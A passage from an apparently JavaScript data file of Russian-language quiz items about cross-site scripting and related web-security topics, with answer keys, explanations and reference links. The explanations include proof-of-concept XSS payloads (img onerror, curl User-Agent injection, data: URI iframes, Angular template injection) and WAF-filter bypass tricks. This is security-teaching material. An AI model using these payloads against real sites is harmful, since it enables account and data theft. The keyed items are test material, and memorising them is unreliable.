            label: "HTML RCDATA elements",
            url: "https://html.spec.whatwg.org/multipage/parsing.html#rcdata-state"
        }
    },
    {
        question: "Можно ли внедрить XSS через имя загружаемого файла?",
        answers: [
            "Да, если имя файла отображается на странице без экранирования (например: <script>.jpg)",
            "Нет, имена файлов всегда безопасны",
            "Только в Windows-системах",
            "Только при загрузке через FTP",
            "Нет, браузеры блокируют такие файлы",
            "Только в ZIP-архивах",
            "Только если файл исполняемый"
        ],
        correctAnswerIndex: 0,
        explanation: "Загрузите файл с именем <img src=x onerror=alert(1)>.jpg. Если имя выводится без экранирования — XSS.",
        link: {
            label: "OWASP: File Upload",
            url: "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"
        }
    },
    {
        question: "Что такое XSS Hunter?",
        answers: [
            "Сервис для обнаружения Blind XSS — предоставляет пейлоады и уведомляет о срабатывании с DOM/скриншотами",
            "Охотник за хакерами",
            "Антивирусная программа",
            "Плагин для Burp Suite",
            "Игра про хакеров",
            "Браузерное расширение",
            "Сканер уязвимостей"
        ],
        correctAnswerIndex: 0,
        explanation: "XSS Hunter Pro и его self-hosted версии — стандартные инструменты для Blind XSS. При срабатывании получаете скриншот, cookies, DOM.",
        link: {
            label: "XSS Hunter",
            url: "https://xsshunter.trufflesecurity.com/"
        }
    },
    {
        question: "Как проверить XSS в HTTP-заголовке User-Agent?",
        answers: [
            "Заменить User-Agent на пейлоад через Burp/curl и проверить, отобразится ли он в логах или на странице",
            "Это невозможно, User-Agent защищён",
            "Только через DevTools браузера",
            "User-Agent не может содержать XSS",
            "Только при использовании мобильного агента",
            "Только через расширение браузера",
            "Только на старых серверах"
        ],
        correctAnswerIndex: 0,
        explanation: "User-Agent часто логируется и выводится в админках. curl -H 'User-Agent: <script>alert(1)</script>' для тестирования.",
        link: {
            label: "PortSwigger: Blind XSS",
            url: "https://portswigger.net/web-security/cross-site-scripting/exploiting"
        }
    },
    {
        question: "Что такое Same-Origin Policy (SOP)?",
        answers: [
            "Политика браузера, запрещающая скриптам одного origin (протокол+домен+порт) читать данные другого",
            "Политика одинаковых паролей",
            "Защита от копирования контента",
            "Ограничение на количество вкладок",
            "Политика единого входа (SSO)",
            "Запрет на дублирование страниц",
            "Ограничение на origin заголовки"
        ],
        correctAnswerIndex: 0,
        explanation: "SOP — фундаментальная защита веба. http://a.com не может читать данные с http://b.com. XSS обходит SOP, выполняясь в контексте уязвимого сайта.",
        link: {
            label: "MDN: Same-origin policy",
            url: "https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy"
        }
    },
    {
        question: "Позволяет ли XSS обойти Same-Origin Policy?",
        answers: [
            "Да, внедрённый скрипт выполняется в origin уязвимого сайта и имеет полный доступ к его данным",
            "Нет, SOP защищает от любых атак",
            "Только в старых браузерах без SOP",
            "Только при отключённом CORS",
            "Нет, XSS и SOP не связаны",
            "Только через Flash-плагины",
            "Зависит от настроек CSP"
        ],
        correctAnswerIndex: 0,
        explanation: "Именно поэтому XSS так опасна — код выполняется от имени уязвимого сайта и может читать cookies, localStorage, делать запросы к API.",
        link: {
            label: "PortSwigger: XSS and SOP",
            url: "https://portswigger.net/web-security/cross-site-scripting"
        }
    },
    {
        question: "Как CORS связан с XSS?",
        answers: [
            "Неправильная настройка CORS (Access-Control-Allow-Origin: *) может усилить XSS, разрешая чтение ответов cross-origin API",
            "CORS полностью защищает от XSS",
            "CORS и XSS никак не связаны",
            "CORS заменяет CSP для защиты от XSS",
            "CORS блокирует все XSS-атаки",
            "XSS обходит CORS автоматически",
            "CORS только для серверных атак"
        ],
        correctAnswerIndex: 0,
        explanation: "XSS + misconfigured CORS — опасная комбинация. Скрипт может читать данные с API других доменов, если они разрешают wildcard origin.",
        link: {
            label: "PortSwigger: CORS",
            url: "https://portswigger.net/web-security/cors"
        }
    },
    {
        question: "Что такое Flash XSS?",
        answers: [
            "XSS уязвимости в Adobe Flash файлах (.swf). Устарели после прекращения поддержки Flash в 2020",
            "Очень быстрый XSS с мгновенным срабатыванием",
            "XSS через световые эффекты страницы",
            "Атака с использованием flash-памяти",
            "XSS в мобильных приложениях",
            "XSS через светодиодные уведомления",
            "Молниеносная атака на сервер"
        ],
        correctAnswerIndex: 0,
        explanation: "Flash мог загружать данные с URL и выводить их без экранирования. FlashVars и ExternalInterface.call() были точками входа для XSS.",
        link: {
            label: "OWASP: Flash Security",
            url: "https://owasp.org/www-community/vulnerabilities/Testing_for_Flash_Vulnerabilities"
        }
    },
    {
        question: "Как WAF (Web Application Firewall) обнаруживает XSS?",
        answers: [
            "По сигнатурам (паттернам вроде <script, onerror=) и эвристике — но их можно обойти",
            "Искусственный интеллект всегда точно определяет XSS",
            "WAF блокирует весь JavaScript по умолчанию",
            "Анализирует намерения пользователя",
            "Проверяет цифровую подпись скриптов",
            "Использует антивирусные базы",
            "Гадает случайным образом"
        ],
        correctAnswerIndex: 0,
        explanation: "WAF ищет <script, alert(, onerror= и т.д. Обход: кодирование (%3Cscript), смешанный регистр (<ScRiPt>), альтернативные теги (<svg onload>).",
        link: {
            label: "PortSwigger: WAF Bypass",
            url: "https://portswigger.net/web-security/cross-site-scripting/contexts"
        }
    },
    {
        question: "Как обойти WAF-фильтр, блокирующий пробелы в XSS?",
        answers: [
            "Использовать / вместо пробела: <img/src=x/onerror=alert(1)> или кодирование %09 %0a %0d",
            "Пробелы нельзя заменить ничем",
            "Использовать двойные пробелы",
            "Использовать нижнее подчёркивание",
            "Использовать точку вместо пробела",
            "Удалить пробелы полностью не получится",
            "WAF невозможно обойти"
        ],
        correctAnswerIndex: 0,
        explanation: "HTML допускает / между тегом и атрибутами. Также работают: %09 (tab), %0a (newline), %0d (carriage return), /**/ в JS.",
        link: {
            label: "PortSwigger XSS Cheat Sheet",
            url: "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
        }
    },
    {
        question: "Что такое MIME Sniffing и как это связано с XSS?",
        answers: [
            "Браузер угадывает Content-Type, игнорируя заголовок. Файл image.gif с HTML-кодом может выполниться как HTML",
            "Определение MIME-типа по запаху файла",
            "Поиск MIME-бомб в запросах",
            "Анализ MIME-сообщений электронной почты",
            "Сжатие файлов с определением типа",
            "Проверка MIME-подписей",
            "Шифрование MIME-контента"
        ],
        correctAnswerIndex: 0,
        explanation: "Если сервер отдаёт HTML с Content-Type: image/gif, браузер может 'понюхать' содержимое и выполнить как HTML. Защита: X-Content-Type-Options: nosniff",
        link: {
            label: "MDN: X-Content-Type-Options",
            url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options"
        }
    },
    {
        question: "Какой HTTP-заголовок защищает от MIME Sniffing?",
        answers: [
            "X-Content-Type-Options: nosniff — запрещает браузеру угадывать тип контента",
            "No-Sniff: enabled — отключает анализ",
            "Content-Detect: disabled — блокирует определение",
            "Secure-MIME: on — защитный режим",
            "MIME-Guard: true — охрана типа",
            "Content-Security: noguess — без угадывания",
            "Anti-Sniff: 1 — антиснифф"
        ],
        correctAnswerIndex: 0,
        explanation: "nosniff заставляет браузер использовать только заявленный Content-Type. Обязательный заголовок для файлов, загружаемых пользователями.",
        link: {
            label: "MDN: X-Content-Type-Options",
            url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options"
        }
    },
    {
        question: "Что такое DOM Clobbering?",
        answers: [
            "Перезапись глобальных JS-переменных через HTML-элементы с id/name. <input id=alert> делает window.alert указывающим на элемент",
            "Избиение DOM-дерева страницы",
            "Клонирование элементов DOM",
            "Удаление всех элементов со страницы",
            "Очистка памяти браузера",
            "Атака на виртуальный DOM React",
            "Переполнение DOM-буфера"
        ],
        correctAnswerIndex: 0,
        explanation: "DOM Clobbering может сломать JS код: <form id=x><input id=y></form> создаёт x.y. Если код использует x.y как URL — можно внедрить свой.",
        link: {
            label: "PortSwigger: DOM Clobbering",
            url: "https://portswigger.net/web-security/dom-based/dom-clobbering"
        }
    },
    {
        question: "Что такое Tabnabbing?",
        answers: [
            "Фишинг-атака: страница, открытая через target=_blank, подменяет содержимое родительской вкладки через window.opener",
            "Набивание табуляцией",
            "Кража вкладок браузера",
            "Атака на клавишу Tab",
            "Переполнение вкладок",
            "Управление табами клавиатуры",
            "Взлом через Tab-индекс"
        ],
        correctAnswerIndex: 0,
        explanation: "Жертва кликает ссылку, новая страница меняет opener.location на фишинговый сайт. Когда жертва возвращается — видит фейк.",
        link: {
            label: "OWASP: Tabnabbing",
            url: "https://owasp.org/www-community/attacks/Reverse_Tabnabbing"
        }
    },
    {
        question: "Как защититься от Tabnabbing?",
        answers: [
            "Добавить rel=\"noopener noreferrer\" к ссылкам с target=\"_blank\"",
            "Не использовать ссылки вообще",
            "Использовать только target=\"_self\"",
            "Отключить JavaScript на странице",
            "Использовать только HTTPS",
            "Добавить CSP strict-dynamic",
            "Установить X-Frame-Options"
        ],
        correctAnswerIndex: 0,
        explanation: "noopener устанавливает window.opener в null. noreferrer дополнительно не передаёт Referer. Современные браузеры добавляют noopener автоматически.",
        link: {
            label: "MDN: rel=noopener",
            url: "https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/noopener"
        }
    },
    {
        question: "Можно ли выполнить XSS через data: URI?",
        answers: [
            "Да: <a href='data:text/html,<script>alert(1)</script>'>. Но браузеры блокируют top-level навигацию",
            "Нет, data: URI полностью безопасны",
            "Только для изображений, не для HTML",
            "Только в устаревших браузерах",
            "Только при отключённом CSP",
            "Только через iframe c sandbox",
            "Да, но скрипт выполняется в null origin"
        ],
        correctAnswerIndex: 0,
        explanation: "data:text/html работает в iframe, но не в адресной строке. Пример: <iframe src='data:text/html,<script>alert(parent.document.domain)</script>'>",
        link: {
            label: "PortSwigger: data URI XSS",
            url: "https://portswigger.net/web-security/cross-site-scripting"
        }
    },
    {
        question: "Что такое Angular Template Injection (CSTI)?",
        answers: [
            "Внедрение Angular-выражений {{constructor.constructor('alert(1)')()}} в шаблоны, которые выполняются фреймворком",
            "Инъекция CSS-шаблонов",
            "Внедрение HTML-комментариев",
            "Атака на серверные шаблоны",
            "Инъекция в import шаблонов",
            "Подмена файлов шаблонов",
            "Внедрение meta-тегов"
        ],
        correctAnswerIndex: 0,
        explanation: "CSTI (Client-Side Template Injection) — когда пользовательские данные попадают в Angular {{ }}, Vue {{ }}, или Handlebars. Это приводит к XSS.",
        link: {
            label: "PortSwigger: Client-side template injection",
            url: "https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs"
        }
    },
    {
        question: "Что такое JSON Hijacking?",
        answers: [
            "Кража JSON-данных путём переопределения Array/Object конструкторов или через JSONP. Современные браузеры защищены",
            "Перехват JSON-токенов авторизации",
            "Подмена JSON-схем валидации",
            "Атака на JSON-парсеры сервера",
            "Внедрение кода в JSON-файлы",
            "Кража JSON из localStorage",
            "Шифрование JSON без ключа"
        ],
        correctAnswerIndex: 0,
        explanation: "Старая атака: <script src='api/users.json'> с переопределением Array.prototype. Защита: X-Content-Type-Options: nosniff и проверка Referer.",
        link: {
            label: "OWASP: JSON Hijacking",
            url: "https://owasp.org/www-community/attacks/JSON_Hijacking"
        }
    },
    {
        question: "Что такое XSS в WebView мобильных приложений?",
        answers: [
            "XSS в компоненте WebView (встроенный браузер в Android/iOS приложении) — может дать доступ к нативному API",
            "XSS только для мобильных браузеров",
            "Атака через мобильный Интернет",
            "XSS в SMS-сообщениях",
            "Атака на мобильные кошельки",
            "XSS через NFC-соединение",
            "Взлом через мобильное приложение"
        ],
        correctAnswerIndex: 0,
        explanation: "Если WebView позволяет JS-bridge к нативному коду (addJavascriptInterface на Android), XSS может вызывать нативные методы.",
        link: {
            label: "OWASP Mobile: WebView",
            url: "https://owasp.org/www-project-mobile-top-10/"
        }
    },
    {
        question: "Как XSS связан с Electron и RCE?",
        answers: [
            "В Electron с nodeIntegration:true XSS позволяет выполнить require('child_process').exec() — полный RCE",
            "Electron полностью защищён от XSS",
            "XSS в Electron только читает файлы",
            "Electron не использует JavaScript",
            "RCE возможен только на сервере",
            "Electron блокирует все скрипты",
            "XSS и Electron не связаны"
        ],
        correctAnswerIndex: 0,
        explanation: "Многие десктопные приложения (VS Code, Slack, Discord) используют Electron. XSS + nodeIntegration = полный контроль над системой пользователя.",
        link: {
            label: "Electron Security",
            url: "https://www.electronjs.org/docs/latest/tutorial/security"
        }
    },
    {
        question: "Нужно ли исправлять XSS в панели администратора?",
        answers: [
            "Да — админа можно заманить по ссылке (Reflected XSS) или атаковать через Stored XSS из данных пользователей",
            "Нет, администраторам можно полностью доверять",
            "Админы не кликают по ссылкам",
            "В админке XSS не критичен",
            "Только если админка публична",
            "Нет, если есть 2FA",
            "Только для внешних администраторов"
        ],
        correctAnswerIndex: 0,
        explanation: "XSS в админке особенно опасен — может дать RCE через функции управления сервером, создание пользователей, загрузку файлов.",
        link: {
            label: "PortSwigger: XSS in admin panels",
            url: "https://portswigger.net/web-security/cross-site-scripting/exploiting"
        }
    },
    {
        question: "Что такое Unicode Normalization атаки и XSS?",
        answers: [
            "Фильтр проверяет символы до нормализации, но после нормализации fullwidth-символы ＜ становятся <",
            "Кодирование текста в Unicode",
            "Стандартизация символов для красоты",
            "Атака на шрифты системы",
            "Перевод текста через Unicode",
            "Нормализация URL в браузере",
            "Атака на Unicode-консорциум"
        ],
        correctAnswerIndex: 0,
        explanation: "Строка ＜script＞ (fullwidth) может пройти фильтр, но при нормализации стать <script>. Фильтр должен работать после нормализации.",
        link: {
            label: "Unicode Security",
            url: "https://unicode.org/reports/tr36/"
        }
    },
    {
        question: "Как проверить XSS через функционал загрузки файлов?",
        answers: [
            "Загрузить HTML/SVG/XML файл со скриптом и попробовать открыть его напрямую по URL",
            "Загрузить только EXE-файлы",
            "Файлы нельзя использовать для XSS",
            "Только через специальные архивы",
            "Только загружая изображения",
            "Это невозможно протестировать",
            "Только через API загрузки"
        ],
        correctAnswerIndex: 0,
        explanation: "Если сервер отдаёт загруженный test.html как text/html — XSS. Проверьте также SVG с onload, XML с xlink.",
        link: {
            label: "OWASP: File Upload",
            url: "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"
        }
    },
    {
        question: "Какой статус XSS в OWASP Top 10 (2021)?",
        answers: [
            "XSS входит в категорию A03:2021 Injection — объединён с SQL Injection и другими инъекциями",
            "A01: Broken Access Control — первое место",
            "A07: Authentication Failures — седьмое место",
            "XSS больше не входит в OWASP Top 10",
            "A10: SSRF — последнее место",
            "Отдельная категория A02: XSS",
            "Объединён с CSRF в A05"
        ],
        correctAnswerIndex: 0,
        explanation: "В OWASP Top 10 2021 XSS перешёл из отдельной категории в A03:Injection. Это не уменьшает его важность — просто реорганизация.",
        link: {
            label: "OWASP Top 10 2021",
            url: "https://owasp.org/Top10/"
        }
    },
    {
        question: "Что такое Permissions Policy (бывший Feature Policy)?",
        answers: [
            "HTTP-заголовок, отключающий опасные API браузера (камера, геолокация, payment) — снижает импакт XSS",
            "Политика доступа к серверу",
            "Настройки разрешений пользователя",
            "То же самое что CSP",
            "Фаервол для браузера",
            "Контроль доступа к файлам",
            "Политика паролей"
        ],
        correctAnswerIndex: 0,
        explanation: "Permissions-Policy: microphone=(), geolocation=() отключает эти API. Даже при XSS атакующий не сможет их использовать.",
        link: {
            label: "MDN: Permissions Policy",
            url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy"
        }
    },
    {
        question: "Какой главный принцип поиска XSS?",
        answers: [
            "Data Flow Analysis — понять как данные входят в приложение, обрабатываются и выводятся без экранирования",
            "Использовать только автоматические сканеры",
            "Писать alert(1) в каждое поле",
            "Угадывать уязвимые места",
            "Искать только в формах",
            "Проверять только GET-параметры",
            "Доверять исходному коду"
        ],
        correctAnswerIndex: 0,
        explanation: "XSS — это источник (source) → обработка → вывод (sink). Найдите где данные входят и где выводятся. Проверьте экранирование на каждом этапе.",
        link: {
            label: "PortSwigger: Finding XSS",
            url: "https://portswigger.net/web-security/cross-site-scripting"
        }
    }
];
